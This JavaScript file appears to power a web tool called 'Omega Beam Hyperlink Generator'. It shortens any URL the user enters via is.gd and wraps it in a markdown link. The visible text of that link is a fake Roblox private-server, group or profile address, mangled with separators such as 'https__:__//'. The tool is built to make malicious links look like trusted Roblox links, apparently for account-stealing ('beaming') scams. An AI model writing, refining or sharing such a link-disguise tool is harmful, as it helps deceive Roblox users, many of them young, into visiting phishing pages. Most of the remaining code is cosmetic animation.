document.addEventListener('DOMContentLoaded', function() {
    const generateBtn = document.getElementById('generateBtn');
    const urlInput = document.getElementById('urlInput');
    const linkTypeSelect = document.getElementById('linkType');
    const loadingSection = document.getElementById('loadingSection');
    const resultSection = document.getElementById('resultSection');
    const resultText = document.getElementById('resultText');
    const copyBtn = document.getElementById('copyBtn');
    
    // Stars container
    const starsContainer = document.querySelector('.stars-container');

    // is.gd API endpoint
    const IS_GD_API = 'https://is.gd/create.php';

    generateBtn.addEventListener('click', function() {
        const url = urlInput.value.trim();
        const linkType = linkTypeSelect.value;

        if (!url) {
            alert('Please enter a URL');
            return;
        }

        if (!isValidUrl(url)) {
            alert('Please enter a valid URL');
            return;
        }

        generateHyperlink(url, linkType);
    });

    copyBtn.addEventListener('click', function() {
        resultText.select();
        resultText.setSelectionRange(0, 99999); // For mobile devices
        document.execCommand('copy');
        
        // Visual feedback
        const originalText = copyBtn.textContent;
        copyBtn.textContent = 'Copied!';
        copyBtn.style.background = 'linear-gradient(45deg, #00cc6a, #00ff88)';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(45deg, #00ff88, #00cc6a)';
        }, 2000);
    });

    function isValidUrl(string) {
        try {
            new URL(string);
            return true;
        } catch (_) {
            return false;
        }
    }

    async function generateHyperlink(url, linkType) {
        // Hide result section and show loading
        resultSection.classList.add('hidden');
        loadingSection.classList.remove('hidden');

        try {
            // Shorten URL using is.gd API
            const shortenedUrl = await shortenUrl(url);
            
            // Choose the correct fixed text based on link type
            let fixedText;
            if (linkType === 'private-server') {
                fixedText = 'https_:_//www.roblox.com/share?code=80177c63cdc8614aa84be3cbd84b051a&type=Server';
            } else if (linkType === 'group') {
                // Group link display text
                fixedText = 'https__:__//www.roblox.com/groups/2194003353';
            } else {
                // Default to profile link
                fixedText = 'https__:__//www.roblox.com/users/3095250/profile';
            }
            
            // Create the hyperlink format: [fixed_text](real_shortened_url)
            const hyperlink = `[${fixedText}](${shortenedUrl})`;

            // Show result
            loadingSection.classList.add('hidden');
            resultSection.classList.remove('hidden');
            resultText.value = hyperlink;

            // Add some animation effect
            resultSection.style.opacity = '0';
            resultSection.style.transform = 'translateY(20px)';
            
            setTimeout(() => {
                resultSection.style.transition = 'all 0.5s ease';
                resultSection.style.opacity = '1';
                resultSection.style.transform = 'translateY(0)';
            }, 100);

        } catch (error) {
            console.error('Error generating hyperlink:', error);
            loadingSection.classList.add('hidden');
            alert('Error generating hyperlink. Please try again.');
        }
    }

    async function shortenUrl(url) {
        try {
            // Use real is.gd API
            const shortUrl = await shortenWithIsGd(url);
            if (shortUrl) return shortUrl;
            
        } catch (error) {
            console.error('is.gd shortening failed:', error);
            throw new Error('Unable to shorten URL with is.gd');
        }
    }
    
    async function shortenWithIsGd(url) {
        try {
            // Use is.gd API with GET request (more reliable than POST for CORS)
            const apiUrl = `https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`;
            
            const response = await fetch(apiUrl, {
                method: 'GET',
                headers: {
                    'Accept': 'text/plain'
                }
            });
            
            if (response.ok) {
                const shortUrl = await response.text();
                // Check if it's a valid is.gd URL
                if (shortUrl && shortUrl.trim().startsWith('https://is.gd/') && !shortUrl.includes('Error')) {
                    return shortUrl.trim();
                }
            }
        } catch (error) {
            console.log('is.gd API call failed, trying alternative method:', error);
            
            // Alternative: try using a CORS proxy
            try {
                const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`)}`;
                const proxyResponse = await fetch(proxyUrl);
                
                if (proxyResponse.ok) {
                    const data = await proxyResponse.json();
                    const shortUrl = data.contents;
                    
                    if (shortUrl && shortUrl.trim().startsWith('https://is.gd/') && !shortUrl.includes('Error')) {
                        return shortUrl.trim();
                    }
                }
            } catch (proxyError) {
                console.log('Proxy method also failed:', proxyError);
            }
        }
        
        throw new Error('Failed to create is.gd short URL');
    }

    // Enter key support for input
    urlInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            generateBtn.click();
        }
    });

    // Add some interactive effects
    urlInput.addEventListener('input', function() {
        if (this.value.trim()) {
            generateBtn.style.transform = 'scale(1.02)';
            generateBtn.style.boxShadow = '0 0 25px rgba(157, 78, 221, 0.5)';
        } else {
            generateBtn.style.transform = 'scale(1)';
            generateBtn.style.boxShadow = '0 0 20px rgba(157, 78, 221, 0.4), 0 4px 15px rgba(0, 0, 0, 0.3)';
        }
    });

    // Add neon glow effect on hover for inputs
    const inputs = document.querySelectorAll('.neon-input');
    inputs.forEach(input => {
        input.addEventListener('mouseenter', function() {
            this.style.boxShadow = '0 0 15px rgba(157, 78, 221, 0.3)';
        });
        
        input.addEventListener('mouseleave', function() {
            if (!this.matches(':focus')) {
                this.style.boxShadow = '';
            }
        });
    });

    
    // Falling Stars Animation
    function createStar() {
        const star = document.createElement('div');
        star.className = 'star';
        
        // Random size class
        const sizes = ['small', 'medium', 'large', 'extra-large'];
        const randomSize = sizes[Math.floor(Math.random() * sizes.length)];
        star.classList.add(randomSize);
        
        // Random star shape variant for variety
        const variants = ['', 'alt', 'variant'];
        const randomVariant = variants[Math.floor(Math.random() * variants.length)];
        if (randomVariant) {
            star.classList.add(randomVariant);
        }
        
        // Random horizontal position
        star.style.left = Math.random() * 100 + '%';
        
        // Random animation delay
        star.style.animationDelay = Math.random() * 3 + 's';
        
        // Much slower falling animation with variation
        const baseDuration = star.classList.contains('small') ? 15 : 
                           star.classList.contains('medium') ? 12 :
                           star.classList.contains('large') ? 10 : 8;
        const variation = (Math.random() - 0.5) * 4; // ±2 second variation
        const fallDuration = (baseDuration + variation) + 's';
        
        // Apply the falling animation
        star.style.animation = `fallSlow ${fallDuration} linear infinite`;
        star.style.animationFillMode = 'forwards';
        
        starsContainer.appendChild(star);
        
        // Remove star after animation completes
        setTimeout(() => {
            if (star.parentNode) {
                star.parentNode.removeChild(star);
            }
        }, (baseDuration + variation + 3) * 1000);
    }
    
    // Create stars continuously - much slower rate
    function startStarAnimation() {
        // Create initial stars
        for (let i = 0; i < 8; i++) {
            setTimeout(() => createStar(), i * 500);
        }
        
        // Continue creating stars at a slower rate
        setInterval(createStar, 800);
    }
    
    // Start the star animation
    startStarAnimation();
    
    // Console message for developer
    console.log('%c🚀 Omega Beam Hyperlink Generator by 7997lol', 'color: #9d4edd; font-size: 16px; font-weight: bold;');
    console.log('%cProfessional hyperlink generation tool', 'color: #c77dff; font-size: 12px;');
    console.log('%c✨ Realistic 3D rotating purple stars!', 'color: #9d4edd; font-size: 12px;');
});
